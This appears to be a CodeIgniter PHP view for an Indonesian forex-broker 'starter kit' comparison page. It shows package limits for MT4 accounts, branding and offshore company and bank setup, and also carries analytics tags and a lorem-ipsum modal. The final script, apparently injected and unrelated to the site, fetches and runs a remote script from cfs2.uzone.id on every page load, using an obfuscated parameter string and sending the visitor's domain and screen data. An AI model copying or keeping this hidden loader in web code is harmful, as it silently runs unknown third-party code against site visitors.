<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?>


<!-- Forexware.com Project - rianhariadi.com -->
<!DOCTYPE html>
<!-- saved from url=(0046)http://forexware.com/en/fx-starter-kit/compare -->
<?php $this->load->view('vd_pages/v_head') ?>


<body>
        <!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
		
        
<?php 
$view_data['page'] =  $page ;

$this->load->view('vd_pages/v_header',$view_data) ?>


<section class="full-width content-container">
	<div class="product-information-container wide starter-kit">
		<h1 class="page-header-big blue">Mulai Bisnis Broker Anda Sendiri</h1>
		<h2 class="page-subhead green">Perbandingan Paket FXStarterKit</h2>
		
		<div class="chart-container">
			<table class="chart">
				<!-- Logo header -->
				<tbody><tr class="chart-head">
					<td colspan="4">
						<img src="<?php echo base_url()?>assets/index_files/fxstarterkitlogolarge.png" alt="FXStarterKit Logo" title="FXStarterKit" width="550">
					</td>
				</tr>
				<!-- Table headers -->
				<tr class="chart-subhead">
					<th>
						<img src="<?php echo base_url()?>assets/index_files/fxstarterkitboxlogolarge.png" alt="FXStarterKit Box" title="FXStarterKit Box" width="220">
					</th>
					<th>
						<img src="<?php echo base_url()?>assets/index_files/icon_starter-box.png" alt="FXStarterKit box">
						<h3 class="chart-col-title">Select</h3>
						<p class="chart-content">Enterpreneur yang ingin memulai bisnis broker FX sendiri tanpa biaya di muka.</p>
					</th>
					<th>
						<img src="<?php echo base_url()?>assets/index_files/icon_starter-double-box.png" alt="FXStarterKit two boxes">
						<h3 class="chart-col-title">Deluxe</h3>
						<p class="chart-content">Enterpreneur Bersemangat atau Institusi Bisnis yang ingin menjalankan bisnis broker forex dengan brand merek sendiri.</p>
					</th>
					<th>
						<img src="<?php echo base_url()?>assets/index_files/icon_starter-triple-box.png" alt="FXStarterKit three boxes">
						<h3 class="chart-col-title">Supreme</h3>
						<p class="chart-content">Enterpreneur Bersemangat yang menginginkan solusi menyeluruh dari broker merek sendiri disertai dengan pembuatan perusahaan dan rekening Bank offshore.</p>
					</th>
				</tr>
				<!-- MT4 -->
				<tr class="chart-section">
					<td colspan="4">MT4</td>
				</tr>
				<tr class="chart-content-row">
					<td>Batas Akun MT4 Aktif</td>
					<td class="bkgd-green">1000</td>
					<td class="bkgd-green">2500</td>
					<td class="bkgd-green">3000</td>
				</tr>
				<tr class="chart-content-row">
					<td>MT4 Grup Awal</td>
					<td class="bkgd-green">16</td>
					<td class="bkgd-green">36</td>
					<td class="bkgd-green">36</td>
				</tr>
				<tr class="chart-content-row">
					<td>Batas MT4 Grup</td>
					<td class="bkgd-green">Unlimited</td>
					<td class="bkgd-green">Unlimited</td>
					<td class="bkgd-green">Unlimited</td>
				</tr>
				<tr class="chart-content-row">
					<td>Batas MT4 Manager</td>
					<td class="bkgd-green">5</td>
					<td class="bkgd-green">5</td>
					<td class="bkgd-green">10</td>
				</tr>
				<tr class="chart-content-row">
					<td>Simbol MT4 ('Shared' / 'Dedicated')</td>
					<td class="bkgd-green">Shared</td>
					<td class="bkgd-green">Shared</td>
					<td class="bkgd-green">Shared</td>
				</tr>
				<tr class="chart-content-row">
					<td>Keamanan MT4 ('Shared' / 'Dedicated')</td>
					<td class="bkgd-green">4 (FX, Metals) Shared</td>
					<td class="bkgd-green">4 (FX, Metals) Shared</td>
					<td class="bkgd-green">4 (FX, Metals) Shared</td>
				</tr>
				<tr class="chart-content-row">
					<td>Markup Level Harga Spread FX &amp; Metal ('Level Grup seragam' / 'Simbol tertentu')</td>
					<td>Level Grup seragam</td>
					<td>Level Grup seragam</td>
					<td>Level Grup seragam</td>
				</tr>
				<tr class="chart-content-row">
					<td>Akses ke MT4 Manager</td>
					<td>YA</td>
					<td>YA</td>
					<td>YA</td>
				</tr>
				<tr class="chart-content-row">
					<td>Terminal Trading MT4 ("Generik" / "Merek Sendiri")</td>
					<td>Generik</td>
					<td>Merek Sendiri</td>
					<td>Merek Sendiri</td>
				</tr>
				<tr class="chart-content-row">
					<td>Mobile Terminal MT4  ("Generik" or "Merek Sendiri")</td>
					<td>Generik</td>
					<td>Merek sendiri dengan tambahan biaya</td>
					<td>Merek sendiri dengan tambahan biaya</td>
				</tr>
				<tr class="chart-content-row">
					<td>Model Bisnis (STP/DD )</td>
					<td>STP</td>
					<td>STP, DD Hybrid</td>
					<td>STP, DD Hybrid</td>
				</tr>
				<tr class="chart-content-row">
					<td>Solusi MAM (Manage Akun Manager)</td>
					<td>YA</td>
					<td>YA</td>
					<td>YA</td>
				</tr>
				<tr class="chart-content-row">
					<td>Akun DEMO</td>
					<td>Berakir 30 hari</td>
					<td>Berakir 30 hari</td>
					<td>Berakir 30 hari</td>
				</tr>
				<tr class="chart-content-row">
					<td>Jumlah Maksimum Open Order untuk DEMO account</td>
					<td>1,000</td>
					<td>1,000</td>
					<td>1,000</td>
				</tr>
				<tr class="chart-content-row">
					<td>UAT</td>
					<td>External dengan klien</td>
					<td>External dengan klien</td>
					<td>External dengan klien</td>
				</tr>
				<!-- Legal Services -->
				<tr class="chart-section">
					<td colspan="4">Layanan Hukum dan Perizinan</td>
				</tr>
				<tr class="chart-content-row">
					<td>Pendirian Badan Usaha</td>
					<td>TIDAK</td>
					<td>TIDAK</td>
					<td>YA</td>
				</tr>
				<tr class="chart-content-row">
					<td>Akun Bank Luar Negeri</td>
					<td>TIDAK</td>
					<td>TIDAK</td>
					<td>YA</td>
				</tr>
				<!-- Liquidity -->
				<tr class="chart-section">
					<td colspan="4">Likuiditas</td>
				</tr>
				<tr class="chart-content-row">
					<td>Laporan Backoffice Online</td>
					<td>Broker Portal</td>
					<td>Broker Portal</td>
					<td>Broker Portal</td>
				</tr>
				<!-- Instruments -->
				<tr class="chart-section">
					<td colspan="4">Instrumen</td>
				</tr>
				<tr class="chart-content-row">
					<td>FX</td>
					<td>46+</td>
					<td>46+</td>
					<td>46+</td>
				</tr>
				<tr class="chart-content-row">
					<td>Metals dan CFDs</td>
					<td>18+</td>
					<td>18+</td>
					<td>18+</td>
				</tr>
			</tbody></table>
		</div>
		
	</div>
</section>


<!-- Sitewide Modal -->
<div class="js-overlay overlay js-modal-overlay-close" id="download"></div>
<div class="content-modal-inner-container">
	<a href="http://forexware.com/en/fx-starter-kit/compare#" class="close-modal js-modal-close">
		<img src="<?php echo base_url()?>assets/index_files/icon_modal-close.png" alt="Close">
	</a>
	<div class="modal-holder">
		<div class="modal-contain">
						
			<div class="modal-backer">
				<h3 class="modal-title">Vestibulum et ipsum vel ipsum place at molestie id quis leo. Sapien integer velit ipsum.</h3>
			
				<form class="email-collection">
					<input type="email" name="email" placeholder="email address">
				</form>
			
				<a class="flat-orange-cta no-icon" href="http://forexware.com/en/fx-starter-kit/compare#">Start Your Download</a>
			</div>

		</div>
	</div>
</div>

<?php $this->load->view('vd_pages/v_footer') ?>




        <script src="<?php echo base_url()?>assets/index_files/jquery.2.1.3.min.js.download"></script>
		<script type="text/javascript" src="<?php echo base_url()?>assets/index_files/jquery.flexslider-min.js.download"></script>        <script>
            $(function(){
                //notification click
                $('#alert').on('click', function(e){
                    if ($(this).data('showdetail')=="yes") {
                        console.log('clicked');
                        e.preventDefault();
                        $('#notetodisplay').slideToggle(function () {
                            ($('#arrow').html() == "⇩") ? $('#arrow').html('⇧') : $('#arrow').html('⇩');
                        });
                    }
                })
            })
        </script>
		<!-- Start of Async HubSpot Analytics Code -->
          <script type="text/javascript">
            (function(d,s,i,r) {
              if (d.getElementById(i)){return;}
              var n=d.createElement(s),e=d.getElementsByTagName(s)[0];
              n.id=i;n.src='//js.hs-analytics.net/analytics/'+(Math.ceil(new Date()/r)*r)+'/94180.js';
              e.parentNode.insertBefore(n, e);
            })(document,"script","hs-analytics",300000);
          </script>
        <!-- End of Async HubSpot Analytics Code -->
		<script type="text/javascript">
			/* <![CDATA[ */
			var google_conversion_id = 989971518;
			var google_conversion_label = "6wMUCPKo-AQQvoiH2AM";
			var google_custom_params = window.google_tag_params;
			var google_remarketing_only = true;
			/* ]]> */
			</script>
			<script type="text/javascript" src="<?php echo base_url()?>assets/index_files/conversion.js.download">
			</script>
			<noscript>
			&lt;div style="display:inline;" class="hidden"&gt;
			&lt;img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/989971518/?value=1.000000&amp;amp;label=6wMUCPKo-AQQvoiH2AM&amp;amp;guid=ON&amp;amp;script=0"/&gt;
			&lt;/div&gt;
			</noscript>
				    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKxMGAByOLEFoOArs6QBWUp7jw4phOJJCcJEE8BTExN9xsKxMynHVCnuac8gR6lIRbI7MV6Uf1Ez487JF%2bgd%2f7pDPlKp2Vr%2b2h5bE%2f9WsWm%2be6PGw2A5v8TrbWyCEwOCwJhAx5wck4QAY%2b5Ie43KUTUhdMkI4DNzdAeCPJGXeBmvsizrRKTW59ao%2b1Y0i7%2fNjAiRDZKRgyuGCz7tM%2f%2b99P3nsu3yk0Nm%2brDPH5S%2bP5LV3hWUE8iH5Dbs5vKxpPmJAJJB58OYlqo60U4QxLxVhMAylhwuh36KeBRGTglwA6AwYkI5H1TCEBbUXHdm0EgHTbKnEquEMx937OPMmlh8LHGf2W9aivIP3fmm%2b6YHeeTBSKgUBVwrxcH%2fDd%2br3dA8TURgyvLY%2fWZTv8SQ8RNW253ngUNlOKzsBTEZQxuykU2L7iQx2ri875xXLUyrx1XGyconV1El8jXgnBkZL%2frEv4FuviSsFeeQcb2AyXLCMeCQSObY04UFeCVdnGr8r5oMBbOyvXU%2bz50b3vjMZplu25edENwK8yoN70GB1Lzc3LbjrRkWMeJL9wXA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>